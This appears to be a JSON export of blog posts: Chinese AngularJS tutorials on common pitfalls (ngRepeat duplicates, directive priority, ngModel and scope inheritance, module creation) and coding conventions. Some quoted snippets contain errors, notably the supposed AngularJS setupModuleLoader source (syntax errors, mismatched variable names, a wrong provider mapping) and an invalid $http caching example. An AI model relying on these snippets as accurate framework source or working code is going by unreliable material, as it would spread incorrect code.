formController.$removeControl(ngModelCtrl); &#125;); &#125; &#125;;&#125;); 然后使用dyName指令：1&lt;input type=\"number\" dy-name=\"item.field\" ng-model=\"demo.deta[item.field]\" min=\"10\" max=\"500\" ng-required=\"true\" /&gt; ngRepeat报重复内容错误有的时候，使用ngRepeat时会遇到报重复key的问题，例如：12345&lt;body ng-controller=\"DemoController as demo\"&gt; &lt;div ng-repeat=\"item in demo.items\"&gt; &#123;&#123;item&#125;&#125; &lt;/div&gt;&lt;/body&gt; JS:12345angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.items = [1,2,3,1,1]; return vm;&#125;); 因为ngRepeat会选择一个key值来关联每一个item对象，并且要求这个key是唯一的，但若使用的基础类型值重复了，则就会出错。 此时ng提供的ngRepeat的自定义key值方法可以解决问题，即track by [key]比如使用$index为key值：12345&lt;body ng-controller=\"DemoController as demo\"&gt; &lt;div ng-repeat=\"item in demo.items track by $index\"&gt; &#123;&#123;item&#125;&#125; &lt;/div&gt;&lt;/body&gt; 指令优先级在设计ng指令时，若在同一个DOM元素上标注多个ng指令，有时需要特殊考虑这些指令的执行顺序，不同的执行顺序可能会导致不同的结果。 比如在ng内置指令中ngRepeat和ngIf指令，当将他们混用时，ngRepeat为了cloneNode产生多条相似的列表记录，而ngIf则按照特定的状态来控制单条记录的显示和隐藏。假设ng在解析指令时线解析了ngIf，那么有可能当前标记的DOM就会被移除，因此ngRepeat也就无法产生多条记录列表了。 因此ng为指令设计了优先级属性（priority）。比如：ngRepeat的priority为1000，ngIf的priority为600。ng会按照优先级来倒序执行它们。在默认情况下，指令优先级为0，可以通过设置terminal属性来指定当前指令的权重为结束界限，若为true，则意味着节点中优先级小于当前指令的其他指令都不会被执行，相同优先级指令不包含。 常用优先级： ngRepeat 1000 ngSwitchWhen 800 ngIf 600 ngInclude 400 ngView 400","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-49-常见“坑”-2-ngModel绑定值不更新","slug":"angularjs49","date":"2017-09-10T01:15:50.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/10/angularjs49/","link":"","permalink":"https://github.com/xmoyKING/2017/09/10/angularjs49/","excerpt":"","text":"ng中$scope是视图（View）和模型（Model）之间的桥梁，是双向绑定机制的核心。 ngModel是ng用来处理表单（form）的最重要的指令，它链接了页面表单中的可交互元素和位于$scope之上的Model，它会自动表ngModel所指向的Model值渲染到form表单的可交互元素上，同时也会根据用户在form表单的输入或交互来更新此Model值。 在源码的实现中，Model的值的格式化，解析，验证都是由ngModel指令所对应的控制器ngModelController来实现的。 有的时候会遇到ngModel所绑定的值无法更新，对于这类问题，主要分两类： Model值不满足表单验证条件，所以ng不会渲染它 由于JS的原型链继承机制，对$scope中属性的赋值并不能更新到父$scope 验证引起的model值不显示问题如下例,修改商品商量，要求输入1-100的自然数：1234567891011&lt;body class=\"container\" ng-app=\"com.ngnice.app\"&gt; &lt;div ng-controller=\"DemoController as demo\"&gt; &lt;div ng-form=\"form\" class=\"form-horizontal\"&gt; &lt;div class=\"form-group\" ng-class=\"&#123;'has-error': form.amount.$invalid&#125;\"&gt; &lt;label for=\"amount\"&gt;Amount&lt;/label&gt; &lt;!-- 此处会出问题 --&gt; &lt;input id=\"amount\" name=\"amount\" type=\"number\" ng-model=\"demo.amount\" class=\"form-control\" placeholder=\"1 - 100\" min=\"1\" max=\"100\"/&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt; JS:12345angular.module('com.ngnice.app', []).controller('DemoController', function()&#123; var vm = this; vm.amount = 0; return vm;&#125;); See the Pen 自定义表单元素 by XmoyKing (@xmoyking) on CodePen. 在上述代码中，ngModel变量amount赋值为0，理论上默认应该显示0，但却没有效果，只显示1-100的placeholder。 ngModel转换函数的源码实现如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445var NUMBER_REGEXP = /^\\s*(\\-|\\+)?(\\d+|(\\d*(\\.\\d*)))\\s*$/;function numberInputType(scope, element, attr, ctrl, $sniffer, $browser)&#123; textInputType(scope, element, attr, ctrl, $sniffer, $browser); ctrl.$parsers.push(function(value)&#123; var empty = ctrl.$isEmpty(value); if(empty || NUMBER_REGEXP.test(value))&#123; ctrl.$setValidity('number', true); return value === '' ? null : (empty ? value : parseFloat(value)); &#125;else&#123; ctrl.$setValidity('number', false); return undefined; &#125; &#125;); addNativeHtml5Validators(ctrl, 'number', numberBadFlags, null, ctrl.$$validityState); ctrl.$formatters.push(function(value)&#123; return ctrl.$isEmpty(value) ? '' : '' + value; &#125;); if(attr.min)&#123; var minValidator = function(value)&#123; var min = parseFloat(attr.min); return validate(ctrl, 'min', ctrl.$isEmpty(value) || value &gt;= min, value); &#125;; ctrl.$parsers.push(minValidator); ctrl.$formatters.push(minValidator); &#125; if(attr.max)&#123; var maxValidator = function(value)&#123; var max = parseFloat(attr.max); return validate(ctrl, 'max', ctrl.$isEmpty(value) || value &lt;= max, value); &#125;; ctrl.$parsers.push(maxValidator); ctrl.$formatters.push(maxValidator); &#125; ctrl.$formatters.push(function(value)&#123; return validate(ctrl, 'number', ctrl.$isEmpty(value) || isNumber(value), value); &#125;);&#125; ngModel作为ng双向绑定的重要组成部分，负责View控件交互数据到$scope上Model的同步。但此处的数据类型是有差异的，View上显示/输入的都是字符串类型，而在Model上的数据则有Number，Date，Array，Object等。 所以ngModel为了实现数据到Model的类型转换，在ngModelController中提供了两个管道数组$formatters和$parsers,分别是将Model的数据转换为View交互控件显示的值和将交互控件上得到的View值转换为Model数据，它们都是一个数组对象，在ngModel启动数据转换时，会以UNIX管道式传递执行这一系列的转换，ng允许手动添加转换函数到$formatters和$parsers中。 同时，此时也是做数据验证最佳时机，能够转换的就是合法的数据。在number组件中，依次添加了对数字验证转换、最小值、最大值的验证。首先会启动$parsers转换，若在转换过程中出现不合法数据，则会利用ngModelController.$setValidity来设置验证错误，并返回undefined。 对于Model数据到交互控件显示，同样也会经过$formatters的转换管道，同时也会利用ngModelController.$setValidity来设置验证错误，并返回undefined。因此不合法的数据不会显示在交互控件上。 所以上述例子，若添加了错误提示信息则会显示错误提示。 原型链继承问题JS中每个对象都会链接到一个原型对象，并且它可以从原型链中继承属性，即使通过字面量创建的对象也会链接到Object.prototype,它是js中的标配默认对象。 js中的原型链继承相对于其他语言常见的继承，是一种另类的继承，它是实施于对象上的动态继承方式，而非常见的实施于类型Class上的静态继承体系，js这种继承方式非常灵活，一个对象可以被多个对象继承，而且它们都同时共享一个实例对象，但这种方式理解起来有时候会比较复杂。 js中，每个函数都有一个原型属性prototype指向自身的原型，而由这个函数创建的对象也有一个proto属性指向这个原型，而函数的原型是一个对象，所以这个对象也会有一个proto的属性指向自己的原型，这样逐层的深入直到Object对象的原型，这就是原型链。 JS原型继承和原型链示例图如下，从左向右看： 函数是由Function函数创建的对象，因此函数也有一个proto属性指向Function函数的原型。真正形成原型链的是每个对象的proto属性，而不是函数的prototype属性。关于原型继承和原型链，可以参考《JavaScript模式》。 js的原型链连接只在属性检索的时候才会启用，若尝试去获取对象的某个属性值，但若该对象没有此属性名，则js会试着从原型对象中获取该属性，依次类推上找，直到Object.prototype, 若最后还是没有，则返回undefined。 这种原型继承在更新属性时不会启用，因此对于基础类型（非引用对象上的属性，即没有.运算符）的属性更新时，它不能更新父对象上的属性，而是在自身对象上更新/创建该属性覆盖同名父属性，这就是ng中对于基础类型的属性不能在子Controller中被修改的原因，导致在子Controller中ngModel的更新并不hi反应在父Controller上。 示例如下：1234567891011121314&lt;body class=\"container\" ng-app=\"com.ngnice.app\"&gt; &lt;div ng-controller=\"ParentController\"&gt; &lt;h4&gt;Parent Controller:&lt;/h4&gt; &lt;pre&gt;&#123;&#123; greet | json &#125;&#125;&lt;/pre&gt; &lt;input type=\"text\" ng-model=\"greet\" class=\"form-control\" /&gt; &lt;div ng-controller=\"ChildController\"&gt; &lt;div class=\"form-group\"&gt; &lt;h4&gt;Child Controller:&lt;/h4&gt; &lt;pre&gt;&#123;&#123; greet | json &#125;&#125;&lt;/pre&gt; &lt;input type=\"text\" ng-model=\"greet\" class=\"form-control\" /&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;/body&gt; JS:123angular.module('com.ngnice.app',[]).controller('ParentController', function($scope)&#123; $scope.greet = 'hello angular';&#125;).controller('ChildController', angular.noop); See the Pen 自定义表单元素 by XmoyKing (@xmoyking) on CodePen. 初始化后，子$scope继承父$scope的greet属性，都显示为hello angular，若修改父Controller的input修改greet属性，则子Controller也会及时更新。因为ngController默认会使用原型链继承来自父对象的属性，所有的$scope都是来自ngApp节点创建的$rootScope，即所有$Scope都直接或间接继承$rootScope。 但当修改子Controller的输入框后，父Controller却不会更新，而且以后父Controller的修改不影响子Controller。原因就是两个Controller的greet属性独立了，各自拥有自己的greet属性。这个问题是由js原型链引起的，而不是ng的问题。 那么如何做到在子Controller中更新父Controller的属性呢。问题在于没有启用原型链的检索，所以若将ngModel的属性变为引用对象，那么js的原型链检索就会被启动，即在ngModel的属性中加入.即可解决问题。 在ngModel的属性值中引入vm变量，隐藏每次修改greet的值，都会触发整个页面的及时同步，这个问题其实可以通过controller as vm的语法来解决更好。 See the Pen 原型链继承问题-解决 by XmoyKing (@xmoyking) on CodePen.","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-48-常见“坑”-1-module函数的声明和获取重载","slug":"angularjs48","date":"2017-09-07T15:38:53.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/07/angularjs48/","link":"","permalink":"https://github.com/xmoyKING/2017/09/07/angularjs48/","excerpt":"","text":"常见“坑”系列：记录一些需要特别注意的的地方与坑。 Module是ng中重要模块组织方式，将一组业务组件（Controller，Service，Filter，Directive…)内聚地封装在一起，将代码按照业务领域划分一个模块，然后在其他模块中声明对这个模块的依赖。这样能更好的“分离关注点”，实现“高内聚低耦合”，“高内聚低耦合”中内聚指的是模块或对象内部的完整性，一组紧密联系的逻辑应该封装在同一个代码单元（模块/对象），而不是分散，耦合指的是代码单元之间的依赖成都，如一个模块的修改会引起另一个模块随之修改则说明这两个模块之间是紧耦合。 同时Module也是ng的代码入口，只有在声明了Module的情况下，才能定义ng组件（Controller，Service，Filter，Directive，Config，Run等） Module的定义为：angular.module(&#39;app&#39;, []),module函数接受三个参数，分别为： name, 模块的名称，它应该是全局唯一的，同时也是必选参数，既可以被其他模块所依赖，也可以作为ngApp指令所引用的主模块。 require，模块的依赖，它指当前模块所依赖的其他模块，需注意，若在此没有声明模块的依赖，则无法在当前模块中使用来自所依赖模块的任何组件。require参数是可选的，若没有传递该参数则表示获取module，反之则表示创建module。 configFn，模块的启动配置函数，该函数会在ng的config阶段被调用，实现对Provider的全局配置，如$routeProvider的路由信息配置，该配置函数等同于module.config方式声明配置信息，一般用module.config方式声明。configFn参数是可选的。 推荐将ng组件放在独立文件内，用一个单独的module文件来创建module和声明module的依赖，其他文件则只获取module，同时在打包或script引入时，需要先加载创建module的文件，然后再加载其他注册ng组件的文件，在FrontJet中，集成了一个gulp-angular-filesort插件，它会自动完成排序工作，保证先加载创建文件。 有一个ng:areq的问题:[ng:areq] Argument &#39;DemoController&#39; is not a function, got undefined!出现的原因若不是忘记定义Controller，那就很有可能时多次创建module，在每次创建module时，都会导致之前创建的module定义信息被清空，以定义的ng组件也会丢失，以下时ng源码：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071function setupModuleLoader(window)&#123; // ... function ensure(obj, name, factory)&#123; return obj[name] || (obj[name]) = factory()); &#125; var angular = ensure(window, 'angular', Object); // 开放window.angular的对外接口 return ensure(window, 'module', function()&#123; var modules = &#123;&#125;; return function module(name, require, configFn)&#123; var assertNotHasOwnProperty = function(name, context)&#123; if(name === 'hasOwnProperty') &#123; // module 名称不能声明为hasOwnProperty throw ngMinErr('badname', 'hasOwnProperty is not a valid &#123;0&#125; name', context); &#125; &#125;; assertNotHasOwnProperty(name, 'module'); if(require &amp;&amp; modules.hasOwnProperty(name)) &#123; //存在requires则为module声明， modules.hasOwnProperty(name) 为true，则说明，已经声明过此模块 module[name] = null; &#125; return ensure(modules, name, function()&#123; if(!requires)&#123; // 在使用前，必须声明module， throw $injectorMinErr('nomod', \"Module '&#123;0&#125;' is not avaliable! You either misspelled \" + \"the module name or forgot to load it. If registering a module ensure that you \" + \"speciafy the dependencies as the second argument.\", name ); &#125; var invokeQueue = []; var runBlocks = []; var config = invokeLater('$injector', 'invoke'); var moduleInstance = &#123; // 各API声明 _invokeQueue: invokeQueue, _runBlocks: runBlocks, requires: requires, name: name, provider: invokeLater('$provide', 'provider'), factory: invokeLater('$provide', 'factory'), service: invokeLater('$provide', 'service'), value: invokeLater('$provide', 'value'), constant: invokeLater('$animateProvider', 'register'), filter: invokeLater('$filterProvider', 'register'), controller: invokeLater('$controllerProvider', 'register'), directive: invokeLater('$directiveProvider', 'register'), config: config, run: function(block)&#123; runBlocks.push(block); return this; &#125; &#125;; if(configFn)&#123; config(configFn); // 缓存模块配置函数 &#125; return moduleInstance; function invokeLater(provider, method, insertMethod)&#123; return function()&#123; invokeQueue[insertMethod || 'push']([provider, method. arguments]); return moduleInstance; // 返回模块实例，形成链式访问 &#125;; &#125; &#125;); &#125;; &#125;);&#125; 首先ng会先确保全局的windo.angular 可用，然后在ng对象上暴露module方法，若名称时hasOwnProperty则会引起混淆，所以需要抛出错误。 在module函数重载中，若requires参数的存在，则表示module为创建，同时若已经存在同名module，则会自动清空已存在的module信息，将其置为null。 在angular.module的返回值moduleInstance中，暴露了ng组件的API，其中_invokeQueue 和 _runBlocks是按名约定的私有属性，不建议使用，其余API都是ng常用的组件声明API，所有的ng组件的定义都会通过invokeLater函数代理，并且它返回值一直保持为moduleInstance实例，方便链式调用。所以推荐使用链式调用而不是声明在一个全局的module变量上。 最后，若传入第三个configFn函数，则它被配置到config信息上，在ng进入config阶段，所有的config信息将会被依次执行，实现对应用或ng组件对象实例的特定配置。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"}]},{"title":"angularjs巩固实践-47-编码规范-2","slug":"angularjs47","date":"2017-09-04T07:57:38.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/04/angularjs47/","link":"","permalink":"https://github.com/xmoyKING/2017/09/04/angularjs47/","excerpt":"","text":"接上文angularjs巩固实践-46-编码规范-1 服务命名服务包括Service、Factory、Value、Constant、Provider等，他们是ng中提供复用逻辑封装的组件，在使用这些服务的地方，需要利用根据所注入服务的用途决定其命名格式： 若是作为实例使用，建议“小写首字母驼峰命名（小驼峰）” 若是作为类使用，建议“大写首字母驼峰命名（大驼峰）”12345678910// 当前用户，作为实例使用angular.module('com.ngnice.app').service('currentUser', function()&#123; this.name = 'abc'; // ...&#125;);// 用户REST资源，作为类使用angular.module('com.ngnice.app').service('Users', function($resource)&#123; return $resource('/api/users/:id', &#123;id: '@id'&#125;);&#125;); 代码复用Service是复用逻辑代码的组件，所以应该将控制器、指令中的业务逻辑封装到Service中。但不能将$scope这类参数传递到Service中，可将需要传入的对象封装为参数对象，且应该只传递所需要的数据。 Service具有单例的特性，因此对于全局View组件，如Modal对话框等，可以尝试封装为Directive，然后在Service中用$compile编译他们。可以参考angular-ui中Modal服务源码。 使用场景ng中提供了Service、Factory、Value、Constant、Provider等声明方式，它们各自针对不同的使用场景： 对于项目配置信息，可以选择Constant，它们可以在ng的config阶段注入，Constant虽然是常量不可变，但对于对象地址的引用，内部属性是可以被修改的，所以推荐使用引用类型。 对于已经存在实例对象的服务，Factory优先，直接返回这个对象，如：在多个Controller之间传递共享数据；对$resource的请求资源的封装。 对于需要new创建的服务而言，则Service优先，ng会自动new并创建这个对象实例。Service更容易组织一组相同业务逻辑的API，使得业务逻辑更加内聚。 对于需要在实例化之前进行特定配置的服务，则使用Provider声明，在Provider服务中定义的服务配置函数，可以在Config阶段被使用。 Service返回值对于服务中函数的返回值，尽量保持统一，都返回Promise对象，使用时统一通过then(success, error)或catch(error)方式。 对于同步的函数，例如webstorage、cookie等操作，建议通过$q.when()将其封装为Promise形式，这样就可以实现如ng的拦截器interceptor一样的管道式AOP机制。 缓存不变数据对于通过$http或者$resource等方式从后端获取的数据，若在SPA的生命周期内不会发生变化，就应该将其缓存起来，减少服务器的负荷，提高性能。1234567$http.post('/url',&#123; id: 1, name: 'king',&#125;, function(res)&#123; // ... catch: true&#125;); RESTful对于RESTful项目优先使用$resource， $resource是在$http基础上为RESTful API专门封装的服务，对资源的CRUD操作提供了统一调用接口。 过滤器命名对于每一个Filter，ng背后都会将其转换为一个名为xxxFilter的服务，本质上是一个服务的实例对象，所以应该使用“小驼峰”格式声明自定义Filter。 重用已有Filter若在其他非View的地方，如Controller、Service等需要复用已有Filter的逻辑，那么可以使用xxxFilter的方式注入该Filter服务以重用它的逻辑：1234567891011121314angular.module('com.ngnice.app').filter('fullName', function()&#123; return function(input, param, /* ... */ )&#123; // code &#125;;&#125;);angular.module('com.ngnice.app').controller('DemoController', function(fullNameFilter)&#123; var vm = this; var input = 'ipt'; var param = 'prms'; fullNameFilter(input, param); return vm;&#125;); 禁止复杂的FilterFilter在每次View渲染的时候，都会在重新执行，所以应该尽可能的简化过滤器的逻辑，不要在Filter中写大量底效率的复杂逻辑，否则会拖慢整个应用。 过滤器是一个JS函数，与函数式对集合的处理流程相似，推荐引入ES6函数式处理，再通过Babal之类的工具将其转换为ES5代码发布。 指令命名由于HTML不区分大小写，所以ng规范规定Directive以驼峰格式声明，它将会转换为全小写-分割的元素名或属性名，如：patmentInfo将转换为paymeny-info 对可复用指令，应该在命名时加上一个短小、唯一、具有描述性的前缀，例如xxTitle。好的前缀能够方便快速识别Directive的内容和起源、防止与其他第三方库出现命名冲突。同时需要避免与已有的常用开源库前缀相同。 Template声明指令中的模版，可以用template属性， 也可以用templateUrl属性，相对而言，templateUrl优于template，它可以指向独立的HTML页面URL（也可以是ng-html2js的$templateCache的缓存简直），或是ng-template的id，这样将HTML和JS分离有利于维护和开发。 link函数的scope参数命名link函数（pre-link和post-link）中的scope对象是一个方法参数，而不是被注入的服务，为了体现这一点，应该以scope命名而不是$scope。 controller as语法、bindToController = true等将独立作用域的变量绑定到controllerAs对象中：123456789101112131415angular.module('com.ngnice.app').controller('DemoController',function()&#123; var vm = this; vm.title = 'hello controller as'; return vm;&#125;);angular.module('com.ngnice.app').directive('hello',function()&#123; return &#123; restrict: 'EA', controllerAs: 'vm', //改为具体的xxVm更好 template: '&lt;div&gt;&#123;&#123;vm.title&#125;&#125;&lt;/div&gt;', // 复杂情况下应该使用templateUrl controller: 'DemoController', bindToController: true, &#125;;&#125;); pre-link和post-link在Directive compile周期中link方法分为pre和post两种，优先使用post，当需要给子节点准备使用数据时才使用pre。 DOM操作指令是操作DOM的推荐方式，不要将DOM操作放在Controller组件中，因为那样难于测试、定位和解决问题。若能使用css来设置样式，animation service或ngShow/ngHide等内置指令解决，应该优先内置指令。 Directive分类按照功能划分，主要分为组件型指令和装饰型指令。 组件型指的是为了分离关注点和语义化，而拆分View形成的指令，主要包括HTML模版和Controller初始化业务逻辑。应该使用Controller，而不是link函数，restrict一般为EA/E， 装饰型指令则是用来建立DOM和Model之间的桥梁，它一般需要在link函数中对DOM操作，但它的逻辑应该精简。一般restrict属性为A。 自动回收当Directive被移除DOM后，应该考虑Directive的自动回收，释放Scope，通过监听$destroy事件来做Directive的清理工作：12345678910angular.module('com.ngnice.app').directive('directiveName', function()&#123; return &#123; restrict: 'EA', link: function(scope, elm, iAttrs)&#123; scope.$on('$destroy', function()&#123; // ... &#125;); &#125; &#125;;&#125;); 模版表达式绑定ng在浏览器解析表达式时，可能出现闪烁问题，为了实现更好的用户体验，应该使用ng-bind或抱在ng-cloak指令中的ng表达式来防止页面渲染时的闪烁。 src/href问题当直接在src或href属性中插入{ {} }表达式时，浏览器会在表达式被解析之前，尝试一次错误的加载，这回出现一个多余的404错误，所以ng专门提供ng-src、ng-href指令来代替src、href属性，可以安全的嵌入表达式。 class优于style对css来说，直接用style属性在html节点上是一种不好的方式，不便于维护和复用前端样式，所以应优先用class，ng中的ngClass和ngStyle也是如此，只有在需要动态计算位置等场景下，使用ngStyle才是合理的。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"code conventions","slug":"code-conventions","permalink":"https://github.com/xmoyKING/tags/code-conventions/"}]},{"title":"angularjs巩固实践-46-编码规范-1","slug":"angularjs46","date":"2017-09-03T08:42:05.000Z","updated":"2017-12-06T14:50:08.915Z","comments":true,"path":"2017/09/03/angularjs46/","link":"","permalink":"https://github.com/xmoyKING/2017/09/03/angularjs46/","excerpt":"","text":"两个术语：“编码规范”、“编程风格”的区别：编程风格是编码规范的一种，用来规约单个文件中的代码规范，编码规范还包含编程的最佳实践、文件和目录组织规范等诸多方面。 软件工程化“黄金定律”：一个项目应该永远遵循一套编码规范，不管多少人共同参与同一项目，一定要确保每一行代码都像同一个人编写的。 编码规范统一非常重要，原因如下： 每一个开发者不用去寻找写代码者是谁，也不需要额外花费精力去理解代码逻辑并依据自己的编码习惯重新改编，每个人都在同一上下文工作，能极大节约时间成本。 能够很容易识别代码的问题并发现问题，当出现一段与众不同的代码时，很有可能问题就出自此。 将一些具体技术、框架的最佳实践、常见的问题和坑编入项目编码规范，能减少很多爬坑时间，并在一定程度上降低代码中潜在的bug。比如：parseInt函数始终传入第二个参数，默认为10，避免错误的转换为其他机制。 目录结构目录结构对一个项目是非常重要的，一个好的目录结构能快速找到需要修改的文件，同时帮助成员高效工作并协调一致。ng项目主要分为两类目录结构组织方式：类型优先型和业务优先型。 类型优先型类型优先型是ng团队最初的angular-seed的组织方式。 app app.js controller FirstCtrl.js SecondCtrl.js ThirdCtrl.js directives directive1.js directive2.js directive3.js filters filter1.js filter2.js filter3.js services service1.js service2.js lib test 按照ng的组件类型，将Controller、Directive、Service、Filter分别放到不同的目录下，并用一个module来组织。它能快速定位文件位置，但不容易将相关代码凑到一起复用到其他项目，所以更适合小型项目。 业务优先型按照业务Feature分类（Feature是一个业务领域的概念，它可能对应一个页面或好几个业务，比如订单、商品、支付都是独立的Feature模块），将不同的Feature分配在不同的目录结构下，他们都拥有自己独立的module，在module同级有按类型组织的Controller、Directive、Service、Filter目录结构，最后再将所有的Feature注入到应用程序的全局module中，对于模块之间公用的组件，将放入common的目录下，它们可以每个组件构建单独的module，也可以放在统一的module之下。 app mainModule.js common controllers.js directives.js filters.js services.js feature1 feature1Module.js controllers FirstCtrl.js SecondCtrl.js directives directive1.js filters filter1.js filter2.js services service1.js service2.js feature2 feature2Module.js controllers FirstCtrl.js SecondCtrl.js directives directive2.js filters filter3.js services service3.js lib test 这样就解决了类型优先型目录结构业务分离的问题，团队保持一致上下文，也能快速定位文件，高效协作。 若针对组件开发，可以尝试将组件的HTML、CSS、JS放在同一位置，以便统一打包发布到bower或npm服务器，在多个项目之间共享，对于HTML文件可以尝试用ng-html2js打包到JS中，缓存在$templateCache服务中。 app directives directive1 directive1.html directive1.js directive1.sass directive2 directive2.html directive2.js directive2.sass 模块组织命名ng module是ng中js代码项目的组织形式，以及模块之间的依赖方式，按照功能划分，将Controller，Service，Filter，Directive内聚在一起，作为可复用的组件模块，建议如java那样，以全小写和.分割保证唯一命名。1angular.module('com.ngnice.app', ['dependency1','dependency2', ...]) Module声明对于同一个业务模块，只在一个文件中用双参数重载方法创建module：angular.module(&#39;com.ngnice.app&#39;,[]),其他文件使用单参重载方法获取module：angular.module(&#39;com.ngnice.app&#39;)。不要添加额外的js变量来保存module。123456789// controller 声明angular.module('com.ngnice.app').controller('DemoController', function()&#123; // ...&#125;);// service 声明angular.module('com.ngnice.app').service('demoService', function()&#123; // ...&#125;); 依赖声明在module声明的时候，应该随时保证模块没有无用的依赖或是冗余的依赖，模块的依赖具有传递性，对于子模块的依赖，同样也会被其所注入的主模块所依赖。应该保证每个模块都自己声明了它所依赖的模块，禁止在主模块中声明某依赖不使用而在其子module使用。这样做的问题是，让本该独立使用的模块却不能单独复用到其他模块了。 Module组件声明将module中的Controller、Service、Factory、Filter、Directive等移到独立文件，并保证组件名称和文件名同步，这样便于复用，也便于快速查找相应的业务组件。对于config、run以及路由这类公共初始化代码可以放在module声明文件，也可以独立出去。把路由按照功能分到多个子模块，而不是只有一个全局路由配置文件:1234567891011121314151617181920212223// bookModule.jsangular.module('com.ngnic.app').config(function($routeProvider)&#123; $routeProvider .when('/book', &#123; templateUrl: 'bool.html', // ... &#125;) .when('/book/:id',&#123; templateUrl: 'bool.html', // ... &#125;);&#125;);// DemoController.jsangular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; return vm;&#125;);// demoService.jsangular.module('com.ngnice.app').service('demoService', function()&#123; var self = this;&#125;); 控制器命名Controller提供了对$scope的初始化和加工处理，并不需要手动实例化。ng会更具路由或ng-controller配置，利用$controller服务自动实例化它。建议以首字母大写的驼峰命名，以及加“Controller”后缀方式命名。 Controller as vm 声明ng1.2后引入Controller as语法，它是$scope方式的语法糖，使得Controller声明更像一个普通的js构造函数POJO，在View模版上ng-controller、路由配置和Directive声明上都可以使用controller as语法。vm是ViewModel的简称，它将ngModel变量中强制加入.变为引用对象，避免js在对原型链上值类型修改的问题。123456789101112131415161718// DemoController.jsangular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; return vm;&#125;);// 视图&lt;div ng-controller=\"DemoController as demo\"&gt;&lt;/div&gt;// 路由angular.module('com.ngnice.app').config(function($routeProvider)&#123; $routeProvider.when('/Book/:bookId', &#123; templateUrl: 'demo.html', controller: DemoController, controllerAs: 'demo' &#125;);&#125;); 初始化数据将页面中的ng-init初始化数据方式，移到Controller代码中，对于默认配置甚至应该推到服务中去，不要让View模版过于复杂，并对于$scope的初始化统一放在Controller代码中，这样便于维护、分工。12345678910111213141516// 不好的用法&lt;div ng-init='person=&#123;name:\"张三\"&#125;'&gt; &lt;pre&gt;&#123;&#123;person | json&#125;&#125;&lt;/pre&gt;&lt;/div&gt;// 推荐用法&lt;div&gt; &lt;pre&gt;&#123;&#123;demo.person | json&#125;&#125;&lt;/pre&gt;&lt;/div&gt;angular.module('com.ngnice.app').controller('DemoController', function()&#123; var vm = this; vm.person = &#123; name: '张三' &#125;&#125;) DOM操作禁止在控制器Controller中操作DOM，将必须的DOM操作移动并封装成一个独立的装饰型指令，在它的link方法中完成，并保持这个指令的功能尽可能简单。 依赖的声明坚持以数组语法方式定义控制器和声明其依赖，对于ng自动解析参数形式的注入，会在js函数混淆的时候，参数名被简化改变，导致注入失败，程序出错。所以坚持以数组的方式或function.$inject方式注入是好的实践，由于使用function.$inject方式注入时需要声明特定的函数名，这样对只使用一次的js函数来说，显得冗余，所以推荐数组方式声明依赖。若使用ES6或CoffeeScript的class方式声明，更推荐function.$inject方式。123angular.module('com.ngnice.app').controller('DemoController', ['demoService', function(demoService)&#123; // ... &#125;]); 对于已经存在自动按参数名注入的项目，可以采用ngAnnotate或者ngMin插件，他们都有Gulp和Grunt插件。 精简控制器逻辑Controller作为加工处理$scope的地方，应该尽可能的精简控制器的逻辑，并将更多的业务逻辑处理抽象到独立的服务中去，这样即便于维护，也能够通过服务来复用到更多的Controller中。 $scope上，应该仅仅添加与视图相关的行为和数据，这些数据都会被View直接使用，不要将无用的数据或函数添加到$scope上，污染$scope，及时清理无用的$scope变量。 禁止用$rootScope传递数据$rootScope是最顶级的scope，其他的scope都是直接或间接派上于它的，在这里声明的变量会被所有非独立scope共享，本质上，它就是一个全局变量，所以应该禁止利用$rootScope来传递和共享数据。 若确实需要全局变量，应该根据场景选择不用的解决方案： 若两个控制器之间耦合比较松散（比如：控制器A发生变化，它会告诉其他控制器，但并不关心谁会处理，也不关心处理结果），那么应该选用事件机制：$emit, $broadcast, $on等，若要通知下级，就用$broadcase,通知上级则用$emit，通知整个应用，则注入$rootScope，然后调用$rootScope.$boradcast向整个应用广播，ui-router等路优酷就是这种方式 若两个控制器存在大量数据共享和交互，那么有2中可选方案，可以利用Factory等服务单例特性为他们专门注入一个共享对象来传递数据，也可以通过它们共同的上级scope来传递数据（但这种方式只能传递被所有下级scope使用的数据），根据软件设计的“组合优于继承”原则，前面一种更好。 格式化显示逻辑对于需要将原始数据转换为特定的用户格式，如货币，时间，过滤，数字格式化等，应该将这部分逻辑抽取成一个Filter，而不要写在Controller中，Filter是专门处理View中格式转化的代码块，它是一个更简单、纯粹的js函数，并且会在每次View被渲染时自动执行。 Resolve路由库，如ui-router或ngRoute提供了resolve机制，用来在进入特定路由之前进行预处理。 若在实例化控制器之前，需要准备一些特定数据，或有条件的阻止禁止路由，那么可以在$routeProvider中配置Resolve属性来解决，Resolve是一个对象，它的key是名称，值可以是一个Promise的异步请求，也可以是一个服务的字符串值。 此外，若只是要阻止进入特定的路由，可以使用ngRoute的$locationChangeStart或uiRoute的$stateChangeStart事件。","categories":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/categories/angularjs/"}],"tags":[{"name":"angularjs","slug":"angularjs","permalink":"https://github.com/xmoyKING/tags/angularjs/"},{"name":"code 